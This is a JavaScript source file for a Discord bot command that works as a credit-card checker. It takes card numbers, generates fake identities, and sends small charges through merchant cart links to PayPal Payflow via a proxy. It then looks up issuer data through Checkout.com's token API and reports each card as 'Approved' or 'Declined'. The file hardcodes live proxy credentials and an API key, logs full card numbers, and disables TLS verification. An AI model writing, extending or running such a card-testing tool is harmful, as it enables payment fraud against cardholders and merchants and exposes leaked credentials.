import { SlashCommandBuilder, EmbedBuilder } from "discord.js";
import axios from "axios";
import https from "https";
const PROXY_CONFIG = {
    host: "brd.superproxy.io",
    port: 33335,
    auth: {
        username: "brd-customer-hl_b34735e4-zone-datacenter_proxy1",
        password: "2rupnulv0s5o",
    },
};
const httpsAgent = new https.Agent({
    rejectUnauthorized: false,
});
function generateRandomString(length, type = 'letters') {
    const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    const digits = "0123456789";
    const chars = type === 'letters' ? letters : digits;
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}
function getRandomUserAgent() {
    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}
function parseJsonValue(source, leftDelim, rightDelim) {
    const leftIndex = source.indexOf(leftDelim);
    if (leftIndex === -1)
        return "";
    const start = leftIndex + leftDelim.length;
    const rightIndex = source.indexOf(rightDelim, start);
    if (rightIndex === -1)
        return "";
    return source.substring(start, rightIndex);
}
function getCardBrand(firstDigit) {
    if (firstDigit === "4")
        return "Visa";
    if (firstDigit === "5")
        return "MasterCard";
    return "Unknown";
}
const links = [
    "https://www.fatfreecartpro.com/i/0w14d?cc",
    "https://www.fatfreecartpro.com/i/0qhs2?cc",
    "https://www.fatfreecartpro.com/i/0vaed?cc",
    "https://www.fatfreecartpro.com/i/0qemo?cc",
    "https://www.fatfreecartpro.com/i/0zmv9?cc",
];
export const data = new SlashCommandBuilder()
    .setName("pp")
    .setDescription("PayPal 0.01$ Authorization")
    .addStringOption((option) => option
    .setName("card")
    .setDescription("Card details in format: CC|MM|YYYY or CC|MM|YYYY|CVV (CVV is ignored)")
    .setRequired(true));
export async function execute(interaction) {
    await interaction.deferReply();
    const cardInput = interaction.options.getString("card", true);
    console.log("[PP] Card:", cardInput);
    const parts = cardInput.split("|");
    if (parts.length !== 3 && parts.length !== 4) {
        await interaction.editReply({
            content: "❌ Invalid format. Use: CC|MM|YYYY or CC|MM|YYYY|CVV (e.g., 4111111111111111|12|2025)",
        });
        return;
    }
    const [cc, mm, yyyy, cvv] = parts.length === 3
        ? [...parts.map((p) => p.trim()), ""]
        : parts.map((p) => p.trim());
    // Extract 2-digit year from input
    let yy1;
    if (yyyy.length === 4) {
        yy1 = yyyy.substring(2);
    }
    else if (yyyy.length === 2) {
        yy1 = yyyy;
    }
    else {
        await interaction.editReply({
            content: "❌ Invalid year format. Use YY or YYYY (e.g., 25 or 2025)",
        });
        return;
    }
    // Remove leading zero from month if present
    const mm1 = mm.startsWith("0") ? mm.substring(1) : mm;
    if (!cc || !mm || !yyyy) {
        await interaction.editReply({
            content: "❌ Required fields: CC|MM|YYYY (CVV is optional and ignored)",
        });
        return;
    }
    try {
        const N1 = generateRandomString(6, 'letters');
        const N2 = generateRandomString(6, 'letters');
        const N3 = generateRandomString(6, 'letters');
        const ran3 = generateRandomString(3, 'digits');
        const ran5 = generateRandomString(5, 'digits');
        const UA = getRandomUserAgent();
        const embed = new EmbedBuilder()
            .setTitle("PayPal Payflow Charge")
            .setColor(0x0099ff)
            .setDescription("Checking Card...")
            .addFields({ name: "Card", value: `\`${cc}|${mm}|${yyyy}\``, inline: true })
            .setTimestamp();
        await interaction.editReply({ embeds: [embed] });
        let result = "";
        let auth = "";
        let avs = "";
        let respMsg = "";
        let amount = "";
        let currency = "";
        let success = false;
        try {
            // Step 1: Get random link and fetch cart info
            const randomLink = links[Math.floor(Math.random() * links.length)];
            console.log("[PP] Fetching cart from:", randomLink);
            const cartResponse = await axios.get(randomLink, {
                proxy: PROXY_CONFIG,
                httpsAgent: httpsAgent,
                headers: {
                    "User-Agent": UA,
                    "Pragma": "no-cache",
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.8",
                },
                timeout: 10000,
            });
            const cartData = String(cartResponse.data);
            amount = parseJsonValue(cartData, '","total":"', '"');
            currency = parseJsonValue(cartData, '","currency":"', '"');
            const id = parseJsonValue(cartData, '","id":"', '"');
            const md5 = parseJsonValue(cartData, '","md5":"', '"');
            const client = parseJsonValue(cartData, '","client_id":"', '"');
            if (!id || !md5 || !client) {
                throw new Error("Failed to get cart information");
            }
            // Step 2: PayPal advanced request
            const email = `${N1}.${ran5}@gmail.com`;
            const paypalUrl = `https://www.fatfreecartpro.com/ecom/ppadvanced.php?client_id=${client}&cart_id=${id}&cart_md5=${md5}&page_ln=en&cb=1745374157&ec_url=&cart_currency=${currency}`;
            const paypalResponse = await axios.post(paypalUrl, `&amount=${amount}&cur=${currency}&cart_id=${id}&cart_md5=${md5}&address_same=true&em_updates=false&email=${email}&name=${N1} ${N2}&fname=${N1}&lname=${N2}&company_name=&phone=13${ran3}${ran5}&address=${ran3} ${N3} street&address2=&city=${N3}&state=${N1}&zip=${ran5}&country=RW&shipping_name=&shipping_fname=&shipping_lname=&shipping_company_name=&shipping_phone=&shipping_address=&shipping_address2=&shipping_city=&shipping_country=US&shipping_state=&shipping_zip=&requiresCardinalCommerce=false&json=true`, {
                headers: {
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-US,en;q=0.7",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://www.fatfreecartpro.com",
                    "referer": `https://www.fatfreecartpro.com/ecom/ccv3/?client_id=${client}&cart_id=${id}&cart_md5=${md5}&c=cc&ejc=4&`,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "sec-gpc": "1",
                    "user-agent": UA,
                },
                timeout: 15000,
            });
            const paypalData = String(paypalResponse.data);
            const tokid = parseJsonValue(paypalData, 'name="SECURETOKENID" value="', '"');
            const tok = parseJsonValue(paypalData, 'name="SECURETOKEN" value="', '"');
            const inv = parseJsonValue(paypalData, 'name="INVOICE" type="hidden" value="', '"');
            const csrf = parseJsonValue(paypalData, 'name="CSRF_TOKEN" type="hidden" value="', '"');
            if (!tokid || !tok) {
                throw new Error("Failed to get secure token");
            }
            // Step 3: Process payment through PayPal Payflow
            const paymentResponse = await axios.post("https://payflowlink.paypal.com/processTransaction.do", `subaction=&CARDNUM=${cc}&EXPMONTH=${mm}&EXPYEAR=${yy1}&CVV2=***&startdate_month=&startdate_year=&issue_number=&METHOD=C&PAYMETHOD=C&FIRST_NAME=${N1}&LAST_NAME=${N2}&template=MINLAYOUT&ADDRESS=${ran3}+${N3}+street&CITY=${N3}&STATE=${N1}&ZIP=${ran5}&COUNTRY=RW&PHONE=&EMAIL=${email}&SHIPPING_FIRST_NAME=&SHIPPING_LAST_NAME=&ADDRESSTOSHIP=&CITYTOSHIP=&STATETOSHIP=&ZIPTOSHIP=&COUNTRYTOSHIP=&PHONETOSHIP=&EMAILTOSHIP=&TYPE=S&SHIPAMOUNT=0.00&TAX=0.00&INVOICE=${inv}&DISABLERECEIPT=TRUE&flag3dSecure=&CURRENCY=${currency}&STATE=${N1}&EMAILCUSTOMER=FALSE&swipeData=0&SECURETOKEN=${tok}&SECURETOKENID=${tokid}&PARMLIST=&MODE=&CSRF_TOKEN=${csrf}&referringTemplate=minlayout`, {
                headers: {
                    "Host": "payflowlink.paypal.com",
                    "User-Agent": UA,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://payflowlink.paypal.com",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-User": "?1",
                    "Priority": "u=0, i",
                    "Pragma": "no-cache",
                    "Cache-Control": "no-cache",
                    "TE": "trailers",
                },
                timeout: 15000,
            });
            const paymentData = String(paymentResponse.data);
            result = parseJsonValue(paymentData, 'name="RESULT" value="', '"');
            auth = parseJsonValue(paymentData, 'name="AUTHCODE" value="', '"');
            avs = parseJsonValue(paymentData, 'name="PROCAVS" value="', '"');
            respMsg = parseJsonValue(paymentData, 'name="RESPMSG" value="', '"');
            success = result === "0" || paymentData.includes('name="RESPMSG" value="Approved:');
            if (respMsg) {
                respMsg = `${result}: ${respMsg}`;
            }
        }
        catch (error) {
            console.error("[PP] PayPal error:", error.message);
        }
        console.log("[PP] Final success status:", success, "Response message:", respMsg);
        // Get BIN info
        let binInfo = "";
        let issuer = "";
        let cardType = "";
        let cardCategory = "";
        let productType = "";
        let issuerCountry = "";
        try {
            const checkoutResponse = await axios.post("https://api.checkout.com/tokens", {
                type: "card",
                number: cc,
                expiry_month: parseInt(mm),
                expiry_year: parseInt(yyyy),
                cvv: "",
                phone: {},
                preferred_scheme: "",
                requestSource: "JS",
            }, {
                proxy: PROXY_CONFIG,
                httpsAgent: httpsAgent,
                headers: {
                    accept: "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-US,en;q=0.6",
                    authorization: "pk_bt7fsefsfszdmxj7sv5kky5ez46",
                    "content-type": "application/json",
                    origin: "https://js.checkout.com",
                    referer: "https://js.checkout.com/",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
                },
                timeout: 10000,
            });
            const binData = checkoutResponse.data;
            const binFull = parseJsonValue(JSON.stringify(binData), '"bin":"', '"');
            issuer = parseJsonValue(JSON.stringify(binData), '"issuer":"', '"');
            cardType = parseJsonValue(JSON.stringify(binData), '"card_type":"', '"');
            cardCategory = parseJsonValue(JSON.stringify(binData), '"card_category":"', '"');
            productType = parseJsonValue(JSON.stringify(binData), '"product_type":"', '"');
            issuerCountry = parseJsonValue(JSON.stringify(binData), '"issuer_country":"', '"');
            binInfo = `${issuer} - ${cardType} ${cardCategory} - ${productType} - ${issuerCountry}`;
        }
        catch (error) {
            console.error("[PP] Checkout.com error:", error.message);
        }
        const isApproved = success;
        const resultEmbed = new EmbedBuilder()
            .setTitle(isApproved ? `✅ Approved ${amount}$ PayPal` : `❌ Declined ${amount}$ PayPal`)
            .setColor(isApproved ? 0x00ff00 : 0xff0000)
            .addFields({ name: "Card", value: `\`${cc}|${mm}|${yyyy}\``, inline: false })
            .setTimestamp();
        if (respMsg) {
            resultEmbed.addFields({
                name: "Response",
                value: respMsg,
                inline: false,
            });
        }
        if (auth) {
            resultEmbed.addFields({
                name: "Auth Code",
                value: auth,
                inline: true,
            });
        }
        if (binInfo) {
            resultEmbed.addFields({ name: "Bindata", value: binInfo, inline: false });
        }
        if (!result && !respMsg) {
            resultEmbed.setDescription("⚠️ Could not process transaction. Gateway may be unavailable or card format invalid.");
        }
        const username = interaction.user.username || interaction.user.tag;
        resultEmbed.setFooter({ text: `Checked by ${username}` });
        await interaction.editReply({ embeds: [resultEmbed] });
    }
    catch (error) {
        console.error("[PP] Error:", error.message);
        await interaction.editReply({
            content: `❌ Error testing card: ${error.message}`,
        });
    }
}
